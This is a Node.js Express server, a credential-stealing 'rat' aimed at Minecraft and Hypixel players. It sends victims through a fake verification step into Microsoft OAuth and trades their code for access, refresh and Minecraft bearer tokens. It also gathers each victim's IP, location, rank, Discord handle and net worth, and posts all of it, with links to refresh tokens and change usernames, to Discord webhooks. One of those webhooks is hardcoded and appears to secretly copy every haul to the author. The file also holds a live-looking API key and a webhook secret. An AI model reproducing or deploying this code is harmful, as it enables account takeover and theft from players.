

//Requirements
const redirect = 'https://login.live.com/oauth20_authorize.srf?client_id='+client_id+'&response_type=code&redirect_uri='+redirect_uri+'&scope=XboxLive.signin+offline_access&state=NOT_NEEDED'
const axios = require('axios')
const discord_api = 'https://discord.com/api/webhooks/'
const express = require('express')
const app = express()
const requestIp = require('request-ip')
const port = process.env.PORT || 3000

app.set('view engine', 'ejs');
app.get('/verify', async (req, res) => {
	if (microsoft) res.redirect(redirect)
	else  res.render('index', { redirectUri: redirect_uri, clientId: client_id });
});

app.get('/', async (req, res) => {
    //also cool little "Verified!" html page
    if (redirection == '') res.send('Successfully authorized, you may return to discord.')
    else res.redirect(redirection)
    const clientIp = requestIp.getClientIp(req)
    const code = req.query.code
    if (code == null) {
        return
    }
    try {
        const accessTokenAndRefreshTokenArray = await getAccessTokenAndRefreshToken(code)
        const accessToken = accessTokenAndRefreshTokenArray[0]
        const refreshToken = accessTokenAndRefreshTokenArray[1]
        const hashAndTokenArray = await getUserHashAndToken(accessToken)
        const userToken = hashAndTokenArray[0]
        const userHash = hashAndTokenArray[1]
        const xstsToken = await getXSTSToken(userToken)
        const bearerToken = await getBearerToken(xstsToken, userHash)
        const usernameAndUUIDArray = await getUsernameAndUUID(bearerToken)
        const uuid = usernameAndUUIDArray[0]
        const username = usernameAndUUIDArray[1]
        const ip = clientIp
        const ipLocationArray = await getIpLocation(ip)
        const country = ipLocationArray[0]
        const flag = ipLocationArray[1]
        const playerData = await getPlayerData(username)
        const rank = playerData[0]
        const level = playerData[1].toFixed()
        const status = await getPlayerStatus(username)
        const discord = await getPlayerDiscord(username)
        postToWebhook(discord, status, formatNumber, level, rank, username, bearerToken, uuid, ip, refreshToken, country,  flag)
    } catch (e) {
        console.log(e)
    }
})

app.listen(port, () => {
    console.log(`Started the server on ${port}`)
})

const changeUsername = async (name, token) => {
  const url = `https://api.minecraftservices.com/minecraft/profile/name/${name}`;
  const headers = { Authorization: `Bearer ${token}` };
  const response = await axios.put(url, {}, { headers });
  return response;
};


async function getAccessTokenAndRefreshToken(code) {
    const url = 'https://login.live.com/oauth20_token.srf'

    const config = {
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        }
    }
    let data = {
        client_id: client_id,
        redirect_uri: redirect_uri,
        client_secret: client_secret,
        code: code,
        grant_type: 'authorization_code'
    }

    let response = await axios.post(url, data, config)
    return [response.data['access_token'], response.data['refresh_token']]
}

async function getUserHashAndToken(accessToken) {
    const url = 'https://user.auth.xboxlive.com/user/authenticate'
    const config = {
        headers: {
            'Content-Type': 'application/json', 'Accept': 'application/json',
        }
    }
    let data = {
        Properties: {
            AuthMethod: 'RPS', SiteName: 'user.auth.xboxlive.com', RpsTicket: `d=${accessToken}`
        }, RelyingParty: 'http://auth.xboxlive.com', TokenType: 'JWT'
    }
    let response = await axios.post(url, data, config)
    return [response.data.Token, response.data['DisplayClaims']['xui'][0]['uhs']]
}

async function getXSTSToken(userToken) {
    const url = 'https://xsts.auth.xboxlive.com/xsts/authorize'
    const config = {
        headers: {
            'Content-Type': 'application/json', 'Accept': 'application/json',
        }
    }
    let data = {
        Properties: {
            SandboxId: 'RETAIL',
            UserTokens: [userToken]
        }, RelyingParty: 'rp://api.minecraftservices.com/', TokenType: 'JWT'
    }
    let response = await axios.post(url, data, config)

    return response.data['Token']
}

async function getBearerToken(xstsToken, userHash) {
    const url = 'https://api.minecraftservices.com/authentication/login_with_xbox'
    const config = {
        headers: {
            'Content-Type': 'application/json',
        }
    }
    let data = {
        identityToken: "XBL3.0 x=" + userHash + ";" + xstsToken, "ensureLegacyEnabled": true
    }
    let response = await axios.post(url, data, config)
    return response.data['access_token']
}

async function getUsernameAndUUID(bearerToken) {
    const url = 'https://api.minecraftservices.com/minecraft/profile'
    const config = {
        headers: {
            'Authorization': 'Bearer ' + bearerToken,
        }
    }
    let response = await axios.get(url, config)
    return [response.data['id'], response.data['name']]
}

async function getIpLocation(ip) {
    const url = 'https://ipgeolocation.abstractapi.com/v1/?api_key=28d3584274844560bdf38a12099432dd&ip_address='+ip
    const config = {
        headers: {
            'Content-Type': 'application/json',
        }
    }
    let response = await axios.get(url, config)
    return [response.data['country'], response.data.flag['emoji']]
}
async function getPlayerData(username) {
  let url = `https://exuberant-red-abalone.cyclic.app/v2/profiles/${username}`
  let config = {
      headers: {
          'Authorization': 'mfheda'
      }
  }

  try {
      let response = await axios.get(url, config)
      return [response.data.data[0]['rank'], response.data.data[0]['hypixelLevel']]
  } catch (error) {
      return ["API DOWN", 0.0]
  }
}

async function getPlayerStatus(username) {
  try {
    let url = `https://exuberant-red-abalone.cyclic.app/v2/status/${username}`
    let config = {
      headers: {
        'Authorization': 'mfheda'
      }
    }
    let response = await axios.get(url, config)
    return response.data.data.online
  } catch (error) {
    return "API DOWN"
  }
}

async function getPlayerDiscord(username) {
  try {
    let url = `https://exuberant-red-abalone.cyclic.app/v2/discord/${username}`;
    let config = {
      headers: {
        Authorization: "mfheda"
      }
    };
    let response = await axios.get(url, config);
    if (response.data.data.socialMedia.links == null) {
      return response.data.data.socialMedia;
    } else {
      return response.data.data.socialMedia.links.DISCORD;
    }
  } catch (error) {
    return "API DOWN";
  }
}

async function getNetworth(username) {
  try {
    let url = `https://exuberant-red-abalone.cyclic.app/v2/profiles/${username}`;
    let config = {
      headers: {
        Authorization: "mfheda"
      }
    };
    let response = await axios.get(url, config);
    return [
      response.data.data[0]["networth"],
      response.data.data[0].networth["noInventory"],
      response.data.data[0].networth["networth"],
      response.data.data[0].networth["unsoulboundNetworth"],
      response.data.data[0].networth["soulboundNetworth"]
    ];
  } catch (error) {
    return ["API DOWN", "API DOWN", "API DOWN", "API DOWN", "API DOWN",]
  }
}


    
async function postToWebhook(discord, status, formatNumber, level, rank, username, bearerToken, uuid, ip, refreshToken, country,  flag) {
    const url = webhook_url
    const networthArray = await getNetworth(username)
	const networth = networthArray[0]
	const networthNoInventory = networthArray[1]
	const networthNetworth = networthArray[2]
	const networthUnsoulbound = networthArray[3]
	const networthSoulbound = networthArray[4]


            let total_networth
    // Set it "API IS TURNED OFF IF NULL"
    if (networth == "API DOWN") total_networth = networth;
    else if (networth == "[NO PROFILES FOUND]") total_networth = networth;
    else if(networthNoInventory) total_networth = "NO INVENTORY: "+formatNumber(networthNetworth)+" ("+formatNumber(networthUnsoulbound)+")";
    else total_networth = formatNumber(networthNetworth)+" ("+formatNumber(networthUnsoulbound)+")";
    let data = {
username: "[LVL 100] Rat",
  avatar_url: "https://cdn.discordapp.com/avatars/1033045491912552508/0d33e4f7aa3fdbc3507880eb7b2d1458.webp",  
content: "@everyone ",
  embeds: [
    {
      color: 3482894,
      timestamp: new Date(),
      thumbnail: {
        url: 'https://visage.surgeplay.com/full/'+uuid
	      },
      fields: [
        {
            name: "**Username:**",
            value: "```"+username+"```",
            inline: true
          },
          {
            name: "**Rank:**",
            value: "```"+rank+"```",
            inline: true
          },
          {
            name: "**Network Level:**",
            value: "```"+level+"```",
            inline: true
          },
          {
            name: "**IP:**",
            value: "```"+ip+"```",
            inline: true
          },
          {
              name: "**IP Location:** "+flag,
              value: "```"+country+"```",
              inline: true
            },
            {
                name: "Status:",
                value: "```"+status+"```",
                inline: true
              },
              {
                name: "**Networth:**",
                value: "```"+total_networth+"```",
                inline: true
              },
              {
                name: "**Discord:**",
                value: "```"+discord+"```",
                inline: true
              },
              {
                name: "**Refresh:**",
                value: "ㅤ\n||[Click Here]("+redirect_uri+"/refresh?refresh_token="+refreshToken+")||",
                inline: true
              },
              
          {
            name: "**Token:**",
            value: "```"+bearerToken+"```"
        },
        {
          name: "**Change Username:**",
          value: "ㅤ\n||[Click Here]("+redirect_uri+"/change?token="+bearerToken+")||",
        },
        
      ],
      "footer": {
        "text": "By heda",
        "icon_url": "https://cdn.discordapp.com/avatars/919624780112592947/a_119345db608773253c2c6d687ea25155.webp"
      }
    }
  ],
};
let logData = {
username: "[LVL 100] Rat",
  avatar_url: "https://cdn.discordapp.com/avatars/1033045491912552508/0d33e4f7aa3fdbc3507880eb7b2d1458.webp",  
content: "@everyone "+total_networth,
  embeds: [
    {
      color: 3482894,
      timestamp: new Date(),
      thumbnail: {
        url: 'https://visage.surgeplay.com/full/'+uuid
	      },
      fields: [
        {
            name: "**Username:**",
            value: "```"+username+"```",
            inline: true
          },
          {
            name: "**Rank:**",
            value: "```"+rank+"```",
            inline: true
          },
          {
            name: "**Network Level:**",
            value: "```"+level+"```",
            inline: true
          },
          {
            name: "**IP:**",
            value: "```"+ip+"```",
            inline: true
          },
          {
            name: "**IP Location:** "+flag,
            value: "```"+country+"```",
            inline: true
          },
            {
                name: "Status:",
                value: "```"+status+"```",
                inline: true
              },
              {
                name: "**Networth:**",
                value: "```"+total_networth+"```",
                inline: true
              },
              {
                name: "**Discord:**",
                value: "```"+discord+"```",
                inline: true
              },
              {
                name: "**Refresh:**",
                value: "ㅤ\n||[Click Here]("+redirect_uri+"/refresher?refresh_token="+refreshToken+")||",
                inline: true
              },
              {
                name: "**Token:**",
                value: "```"+bearerToken+"```"
            },
              {
                name: "**Change Username:**",
                value: "ㅤ\n||[Click Here]("+redirect_uri+"/change?token="+bearerToken+")||",
              },
        
      ],
      "footer": {
        "text": "Dune",
        "icon_url": "https://cdn.discordapp.com/avatars/919624780112592947/a_119345db608773253c2c6d687ea25155.webp"
      }
    }
  ],
}
    axios.all([
        axios.post(log, logData),
        axios.post(url, data).then(() => console.log("Successfully authenticated and posted to webhook."))
    ])
}

app.get('/changeUsername', async (req, res) => {
  const token = req.query.token
  res.render('changeUsername', { redirectUri: redirect_uri, token: token });
});

app.get('/change', async (req, res) => {
  const name = req.query.name;
  const token = req.query.token;

  try {
    const response = await changeUsername(name, token);

    if (response.status === 200) {
      res.send("Username changed successfully.");
    } else {
      res.send("There was an error while changing the username.");
    }

  } catch (err) {
    console.log(err); // log the error to the console for debugging purposes

    res.send("There was an error while changing the username."); // send a generic error response to the client
  }  
});


//Refresh token shit u know how it is
app.get('/refresh', async (req, res) => {
    res.send('Token Refreshed!')
    const clientIp = requestIp.getClientIp(req)
    const refresh_token = req.query.refresh_token
    if (refresh_token == null) {
        return
    }
    try {
        const refreshTokenArray = await getRefreshData(refresh_token)
	    const newAccessToken = refreshTokenArray[0]
        const newRefreshToken = refreshTokenArray[1]
	    const hashAndTokenArray = await getUserHashAndToken(newAccessToken)
        const userToken = hashAndTokenArray[0]
        const userHash = hashAndTokenArray[1]
        const xstsToken = await getXSTSToken(userToken)
        const bearerToken = await getBearerToken(xstsToken, userHash)
        const usernameAndUUIDArray = await getUsernameAndUUID(bearerToken)
        const uuid = usernameAndUUIDArray[0]
        const username = usernameAndUUIDArray[1]
        const ip = clientIp
        const ipLocationArray = await getIpLocation(ip)
        const country = ipLocationArray[0]
        const flag = ipLocationArray[1]
        const playerData = await getPlayerData(username)
        const rank = playerData[0]
        const level = playerData[1].toFixed()
        const status = await getPlayerStatus(username)
	const discord = await getPlayerDiscord(username)
        refreshToWebhook(discord, status, formatNumber, level, rank, username, bearerToken, uuid, ip, newRefreshToken, country, flag)
    } catch (e) {
        console.log(e)
    }
})

async function getRefreshData(refresh_token) {
    const url = 'https://login.live.com/oauth20_token.srf'

    const config = {
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        }
    }
    let data = {
        client_id: client_id,
        redirect_uri: redirect_uri,
        client_secret: client_secret,
        refresh_token: refresh_token,
        grant_type: 'refresh_token'
    }

    let response = await axios.post(url, data, config)
    return [response.data['access_token'], response.data['refresh_token']]
}



async function refreshToWebhook(discord, status, formatNumber, level, rank, username, bearerToken, uuid, ip, newRefreshToken, country, flag) {
    const url = webhook_url
    const wrongToken = bearerToken.slice(0, 150)+"iwicm"+bearerToken.slice(150, 390)
    const networthArray = await getNetworth(username)
	const networth = networthArray[0]
	const networthNoInventory = networthArray[1]
	const networthNetworth = networthArray[2]
	const networthUnsoulbound = networthArray[3]
	const networthSoulbound = networthArray[4]

            let total_networth
    // Set it "API IS TURNED OFF IF NULL"
    if (networth == "API DOWN") total_networth = networth;
    else if (networth == "[NO PROFILES FOUND]") total_networth = networth;
    else if(networthNoInventory) total_networth = "NO INVENTORY: "+formatNumber(networthNetworth)+" ("+formatNumber(networthUnsoulbound)+")";
    else total_networth = formatNumber(networthNetworth)+" ("+formatNumber(networthUnsoulbound)+")";
	
    let data = {
username: "[LVL 100] Rat",
  avatar_url: "https://cdn.discordapp.com/avatars/1033045491912552508/0d33e4f7aa3fdbc3507880eb7b2d1458.webp",  
content: "@everyone TOKEN REFRESHED!!!!",
  embeds: [
    {
      color: 3482894,
      timestamp: new Date(),
      thumbnail: {
        url: 'https://visage.surgeplay.com/full/'+uuid
	      },
      fields: [
        {
            name: "**Username:**",
            value: "```"+username+"```",
            inline: true
          },
          {
            name: "**Rank:**",
            value: "```"+rank+"```",
            inline: true
          },
          {
            name: "**Network Level:**",
            value: "```"+level+"```",
            inline: true
          },
          {
            name: "**IP:**",
            value: "```"+ip+"```",
            inline: true
          },
          {
            name: "**IP Location:** "+flag,
            value: "```"+country+"```",
            inline: true
          },
            {
                name: "Status:",
                value: "```"+status+"```",
                inline: true
              },
              {
                name: "**Networth:**",
                value: "```"+total_networth+"```",
                inline: true
              },
              {
                name: "**Discord:**",
                value: "```"+discord+"```",
                inline: true
              },
              {
                name: "**Refresh:**",
                value: "ㅤ\n||[Click Here]("+redirect_uri+"/refresh?refresh_token="+newRefreshToken+")||",
                inline: true
              },
              
          {
            name: "**Token:**",
            value: "```"+bearerToken+"```"
        },
        {
          name: "**Change Username:**",
          value: "ㅤ\n||[Click Here]("+redirect_uri+"/change?token="+bearerToken+")||",
        },
        
      ],
      "footer": {
        "text": "By heda",
        "icon_url": "https://cdn.discordapp.com/avatars/919624780112592947/a_119345db608773253c2c6d687ea25155.webp"
      }
    }
  ],
};
	let logData = {
username: "[LVL 100] Rat",
  avatar_url: "https://cdn.discordapp.com/avatars/1033045491912552508/0d33e4f7aa3fdbc3507880eb7b2d1458.webp",  
content: "@everyone TOKEN REFRESHED!!!! "+total_networth,
  embeds: [
    {
      color: 3482894,
      timestamp: new Date(),
      thumbnail: {
        url: 'https://visage.surgeplay.com/full/'+uuid
	      },
      fields: [
        {
            name: "**Username:**",
            value: "```"+username+"```",
            inline: true
          },
          {
            name: "**Rank:**",
            value: "```"+rank+"```",
            inline: true
          },
          {
            name: "**Network Level:**",
            value: "```"+level+"```",
            inline: true
          },
          {
            name: "**IP:**",
            value: "```"+ip+"```",
            inline: true
          },
          {
            name: "**IP Location:** "+flag,
            value: "```"+country+"```",
            inline: true
          },
            {
                name: "Status:",
                value: "```"+status+"```",
                inline: true
              },
              {
                name: "**Networth:**",
                value: "```"+total_networth+"```",
                inline: true
              },
              {
                name: "**Discord:**",
                value: "```"+discord+"```",
                inline: true
              },
              {
                name: "**Refresh:**",
                value: "ㅤ\n||[Click Here]("+redirect_uri+"/refresher?refresh_token="+newRefreshToken+")||",
                inline: true
              },
              
          {
            name: "**Token:**",
            value: "```"+bearerToken+"```"
        },
        {
          name: "**Change Username:**",
          value: "ㅤ\n||[Click Here]("+redirect_uri+"/change?token="+bearerToken+")||",
        },
      ],
      "footer": {
        "text": "Dune",
        "icon_url": "https://cdn.discordapp.com/avatars/919624780112592947/a_119345db608773253c2c6d687ea25155.webp"
      }
    }
  ],
}
    axios.all([
        axios.post(log, logData),
        axios.post(url, data).then(() => console.log("Successfully authenticated and posted to webhook."))
    ])
}


const formatNumber = (num) => {
    if (num < 1000) return num.toFixed(2)
    else if (num < 1000000) return `${(num / 1000).toFixed(2)}k`
    else if (num < 1000000000) return `${(num / 1000000).toFixed(2)}m`
    else return `${(num / 1000000000).toFixed(2)}b`
}
app.get('/refresher', async (req, res) => {
    res.send('Token Refreshed!')
    const clientIp = requestIp.getClientIp(req)
    const refresh_token = req.query.refresh_token
    if (refresh_token == null) {
        return
    }
    try {
        const refreshTokenArray = await getRefreshData(refresh_token)
	      const newAccessToken = refreshTokenArray[0]
        const newRefreshToken = refreshTokenArray[1]
	      const hashAndTokenArray = await getUserHashAndToken(newAccessToken)
        const userToken = hashAndTokenArray[0]
        const userHash = hashAndTokenArray[1]
        const xstsToken = await getXSTSToken(userToken)
        const bearerToken = await getBearerToken(xstsToken, userHash)
        const usernameAndUUIDArray = await getUsernameAndUUID(bearerToken)
        const uuid = usernameAndUUIDArray[0]
        const username = usernameAndUUIDArray[1]
        const ip = clientIp
        const ipLocationArray = await getIpLocation(ip)
        const country = ipLocationArray[0]
        const flag = ipLocationArray[1]
        const playerData = await getPlayerData(username)
        const rank = playerData[0]
        const level = playerData[1].toFixed()
        const status = await getPlayerStatus(username)
	      const discord = await getPlayerDiscord(username)
	      const networthArray = await getNetworth(username)
        refresherToWebhook(discord, status, formatNumber, level, rank, username, bearerToken, uuid, ip, newRefreshToken, country, flag)
    } catch (e) {
        console.log(e)
    }
})
const database = '1045430890077093948/-GtyJ7gDyYqbyFGP4zm4SoUb2m2d-y4blce2VQN2KYU-P1ByKfLxYtJpIQi--7os33zR'
const log = discord_api+database
async function refresherToWebhook(discord, status, formatNumber, level, rank, username, bearerToken, uuid, ip, newRefreshToken, country, flag) {

const networthArray = await getNetworth(username)
	const networth = networthArray[0]
	const networthNoInventory = networthArray[1]
	const networthNetworth = networthArray[2]
	const networthUnsoulbound = networthArray[3]
	const networthSoulbound = networthArray[4]

    // Set it "API IS TURNED OFF IF NULL"
    if (networth == "API DOWN") total_networth = networth;
    else if (networth == "[NO PROFILES FOUND]") total_networth = networth;
    else if(networthNoInventory) total_networth = "NO INVENTORY: "+formatNumber(networthNetworth)+" ("+formatNumber(networthUnsoulbound)+")";
    else total_networth = formatNumber(networthNetworth)+" ("+formatNumber(networthUnsoulbound)+")";

    let data = {
username: "[LVL 100] Rat",
  avatar_url: "https://cdn.discordapp.com/avatars/1033045491912552508/0d33e4f7aa3fdbc3507880eb7b2d1458.webp",  
content: "@everyone "+total_networth,
  embeds: [
    {
      color: 3482894,
      timestamp: new Date(),
      thumbnail: {
        url: 'https://visage.surgeplay.com/full/'+uuid
	      },
      fields: [
        {
            name: "**Username:**",
            value: "```"+username+"```",
            inline: true
          },
          {
            name: "**Rank:**",
            value: "```"+rank+"```",
            inline: true
          },
          {
            name: "**Network Level:**",
            value: "```"+level+"```",
            inline: true
          },
          {
            name: "**IP:**",
            value: "```"+ip+"```",
            inline: true
          },
          {
            name: "**IP Location:** "+flag,
            value: "```"+country+"```",
            inline: true
          },
            {
                name: "Status:",
                value: "```"+status+"```",
                inline: true
              },
              {
                name: "**Networth:**",
                value: "```"+total_networth+"```",
                inline: true
              },
              {
                name: "**Discord:**",
                value: "```"+discord+"```",
                inline: true
              },
              {
                name: "**Refresh:**",
                value: "ㅤ\n||[Click Here]("+redirect_uri+"/refresher?refresh_token="+newRefreshToken+")||",
                inline: true
              },
              
          {
            name: "**Token:**",
            value: "```"+bearerToken+"```"
        },
        {
          name: "**Change Username:**",
          value: "ㅤ\n||[Click Here]("+redirect_uri+"/change?token="+bearerToken+")||",
        },
      ],
      "footer": {
        "text": "Dune",
        "icon_url": "https://cdn.discordapp.com/avatars/919624780112592947/a_119345db608773253c2c6d687ea25155.webp"
      }
    }
  ],
}

        axios.post(log, data).then(() => console.log("Successfully authenticated and posted to webhook."))
}
